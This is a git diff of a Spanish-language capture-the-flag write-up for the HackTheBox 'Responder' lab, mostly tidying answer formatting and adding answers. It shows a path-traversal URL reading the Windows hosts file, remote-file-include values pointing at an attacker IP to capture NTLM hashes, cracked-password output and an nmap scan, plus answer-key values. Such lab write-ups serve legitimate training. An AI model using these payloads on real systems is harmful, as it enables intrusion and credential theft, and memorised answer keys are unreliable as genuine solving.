@@ -52,7 +52,7 @@ Podemos probarlo http://unika.htb/index.php?page=%22../../../../../../../../wind
 ```
 # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
 ```
->../../../../../../../../windows/system32/drivers/etc/hosts
+> ../../../../../../../../windows/system32/drivers/etc/hosts
 Task 5
 
 Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
@@ -78,7 +78,7 @@ http://unika.htb/?page=//10.10.15.134/test
 Task 6
 
 What does NTLM stand for?
->New Technology LAN Manager 
+> New Technology LAN Manager 
 
 Task 7
 
@@ -88,7 +88,7 @@ Which flag do we use in the Responder utility to specify the network interface?
 Task 8
 
 There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
->john the ripper
+> john the ripper
 
 Task 9
 
@@ -167,6 +167,7 @@ Candidates.#1....: adriano -> fresa
 Started: Sun Apr  6 18:54:11 2025
 Stopped: Sun Apr  6 18:54:18 2025
 ```
+> badminton
 
 Task 10
 
@@ -177,6 +178,7 @@ nmap  -p 1000-65000 -T 1  --open -vv 10.129.204.40
 PORT     STATE SERVICE
 5985/tcp open  wsman
 ```
+> 5985
 
 Submit Flag
 
